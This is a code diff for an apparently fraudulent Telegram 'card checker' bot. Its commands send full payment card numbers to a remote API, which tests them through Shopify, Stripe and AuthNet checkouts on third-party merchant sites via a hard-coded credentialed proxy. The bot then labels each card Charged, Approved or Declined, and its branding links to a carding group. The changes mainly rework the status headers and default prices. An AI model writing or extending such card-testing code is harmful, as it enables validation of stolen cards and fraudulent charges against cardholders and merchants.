@@ -2723,7 +2723,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         processing_text = (
             f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
             f"<pre><code>{full_card}</code></pre>\n\n"
-            f"{bullet_link} <b>Gateway ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚</b>\n"
+            f"{bullet_link} <b>Gateway ➵ Shopify</b>\n"
             f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
         )
 
@@ -2758,7 +2758,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         response = data.get("Response", "Unknown")
         gateway = data.get("Gateway", "Shopify")
-        price = data.get("Price", "N/A")
+        price = data.get("Price", "0.98$")
 
         # --- BIN lookup ---
         try:
@@ -2783,21 +2783,34 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
+        # --- Determine header status ---
+        header_status = "❌ Declined"  # default
+
+        if re.search(r"\b(Thank You|approved|success|charged)\b", response, re.I):
+            header_status = "🔥 Charged"
+        elif "3D_AUTHENTICATION" in response.upper():
+            header_status = "✅ Approved"
+        elif "INVALID_CVC" in response.upper():
+            header_status = "✅ Approved"
+        elif "CARD_DECLINED" in response.upper():
+            header_status = "❌ Declined"
+
         # --- Enhance response with emojis ---
         display_response = escape(response)
-
-        if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
+        if re.search(r"\b(Thank You|approved|success|charged)\b", response, re.I):
             display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
         elif "3D_AUTHENTICATION" in response.upper():
             display_response = f"{escape(response)} 🔒"
+        elif "INVALID_CVC" in response.upper():
+            display_response = f"{escape(response)} ✅"
         elif "CARD_DECLINED" in response.upper():
             display_response = f"{escape(response)} ❌"
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>SHOPIFY</b> 〕━━◇\n"
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟎.𝟗𝟖$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ Shopify {price}\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -2954,7 +2967,7 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         processing_text = (
             f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
             f"<pre><code>{full_card}</code></pre>\n\n"
-            f"{bullet_link} <b>Gateway ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚</b>\n"
+            f"{bullet_link} <b>Gateway ➵ HC</b>\n"
             f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
         )
 
@@ -3014,20 +3027,28 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-        # --- Enhance response with emojis ---
+        # --- Determine header status + emojis ---
         display_response = escape(response)
-        if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
+        header_status = "❌ Declined"  # default
+
+        if re.search(r"\b(Thank You|approved|success|charged)\b", response, re.I):
             display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            header_status = "🔥 Charged"
         elif "3D_AUTHENTICATION" in response.upper():
             display_response = f"{escape(response)} 🔒"
+            header_status = "✅ Approved"
+        elif "INVALID CVC" in response.upper():
+            display_response = f"{escape(response)} ⚠️"
+            header_status = "⚠️ Invalid CVC"
         elif "CARD_DECLINED" in response.upper():
             display_response = f"{escape(response)} ❌"
+            header_status = "❌ Declined"
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>𝑺𝒉𝒐𝒑𝒊𝒇𝒚</b> 〕━━◇\n"
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟏𝟎$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 {price}\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3054,7 +3075,6 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
-
 
 
 # --- Main /sh command ---
@@ -3193,7 +3213,6 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         )
 
         # --- API request ---
-        # NOTE: adjust this endpoint/params if your backend expects different query keys for Stripe.
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://vasileandpavel.com"
@@ -3219,7 +3238,7 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
 
         response = data.get("Response", "Unknown")
         gateway = data.get("Gateway", "Stripe")
-        price = data.get("Price", "3$")  # default to 3$
+        price = data.get("Price", "3$")
 
         # --- BIN lookup ---
         try:
@@ -3248,14 +3267,20 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         display_response = escape(response)
         if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
             display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            header_status = "🔥 Charged"
         elif "3D_AUTHENTICATION" in response.upper():
             display_response = f"{escape(response)} 🔒"
+            header_status = "✅ Approved"
+        elif "INVALID CVC" in response.upper():
+            header_status = "✅ Approved"
         elif "CARD_DECLINED" in response.upper():
-            display_response = f"{escape(response)} ❌"
+            header_status = "❌ Declined"
+        else:
+            header_status = "❌ Declined"
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>𝑺𝒕𝒓𝒊𝒑𝒆</b> 〕━━◇\n"
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐒𝐭𝐫𝐢𝐩𝐞 𝟑$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
@@ -3284,6 +3309,7 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
             )
         except Exception:
             pass
+
 
 
 
@@ -3405,6 +3431,22 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 # --- HC Processor ---
+import aiohttp
+import asyncio
+import json
+import logging
+import re
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
+logger = logging.getLogger(__name__)
+
+# === Your helper functions (assumed already defined elsewhere) ===
+# - consume_credit(user_id) -> bool
+# - get_bin_info(bin_number: str) -> dict
+
 async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
     Process a /at command: check AuthNet card, display response and BIN info.
@@ -3437,7 +3479,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         processing_text = (
             f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
             f"<pre><code>{full_card}</code></pre>\n\n"
-            f"{bullet_link} <b>Gateway ➵ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭 𝐂𝐡𝐚𝐫𝐠𝐞</b>\n"
+            f"{bullet_link} <b>Gateway ➵ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭</b>\n"
             f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
         )
 
@@ -3455,9 +3497,19 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
-                api_response = await resp.text()
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
+                    api_response = await resp.text()
+        except asyncio.TimeoutError:
+            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
+            return
+        except Exception as e:
+            await processing_msg.edit_text(
+                f"❌ API request failed: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
 
         # --- Parse API response ---
         try:
@@ -3472,7 +3524,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         response = data.get("Response", "Unknown")
         gateway = data.get("Gateway", "AuthNet")
-        price = data.get("Price", "2.95$")
+        price = data.get("Price", "0.98$")
 
         # --- BIN lookup ---
         try:
@@ -3497,20 +3549,27 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-        # --- Enhance response with emojis ---
+        # --- Enhance response with emojis & dynamic header ---
         display_response = escape(response)
         if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
-            display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            header_status = "🔥 Charged"
         elif "3D_AUTHENTICATION" in response.upper():
-            display_response = f"{escape(response)} 🔒"
+            display_response += " 🔒"
+            header_status = "✅ Approved"
         elif "CARD_DECLINED" in response.upper():
-            display_response = f"{escape(response)} ❌"
+            header_status = "❌ Declined"
+        elif "INSUFFICIENT_FUNDS" in response.upper():
+            display_response += " 💳"
+            header_status = "💳 Insufficient Funds"
+        else:
+            header_status = "❌ Declined"
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>𝑨𝒖𝒕𝒉𝑵𝒆𝒕</b> 〕━━◇\n"
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟎.𝟗𝟖$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 {escape(price)}\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3537,6 +3596,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
+
 
 
 
@@ -3950,21 +4010,31 @@ async def process_card_check(user, card_input, custom_urls, msg):
         gateway = best_result.get("Gateway", "Shopify")
         site_used = best_result.get("site", "N/A")
 
+        # --- Dynamic Header Status ---
+        header_status = "❌ Declined"  # default
+        if re.search(r"\b(Thank You|approved|success|charged)\b", response_text, re.I):
+            header_status = "🔥 Charged"
+        elif "3D_AUTHENTICATION" in response_text.upper():
+            header_status = "✅ Approved"
+        elif "INSUFFICIENT_FUNDS" in response_text.upper():
+            header_status = "💳 Insufficient Funds"
+        elif "CARD_DECLINED" in response_text.upper():
+            header_status = "❌ Declined"
+
+        # --- Requester ---
         full_name = " ".join(filter(None, [user.first_name, user.last_name]))
         requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
 
-        # Enhance Response
+        # --- Enhance Response ---
         display_response = escape(response_text)
         if re.search(r"\b(Thank You|approved|charged|success)\b", response_text, re.I):
             display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
         elif "3D_AUTHENTICATION" in response_text.upper():
             display_response += " 🔒"
-        elif "CARD_DECLINED" in response_text.upper():
-            display_response += " ❌"
         elif "INSUFFICIENT_FUNDS" in response_text.upper():
             display_response += " 💳"
 
-        # Branding
+        # --- Branding ---
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
@@ -3972,8 +4042,9 @@ async def process_card_check(user, card_input, custom_urls, msg):
         BULLET_GROUP_LINK = "https://t.me/CARDER33"
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
+        # --- Final Message ---
         formatted_msg = f"""
-◇━━〔 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚 〕━━◇
+◇━━〔 <b>{header_status}</b> 〕━━◇
 {bullet_link} 𝐂𝐚𝐫𝐝       ➵ <code>{card_input}</code>
 {bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➵ <i>{escape(gateway)}</i>
 {bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➵ {price} 💸
@@ -3998,6 +4069,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         logger.exception("Error in process_card_check")
         await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>",
                             parse_mode=ParseMode.HTML)
+
 
 
 
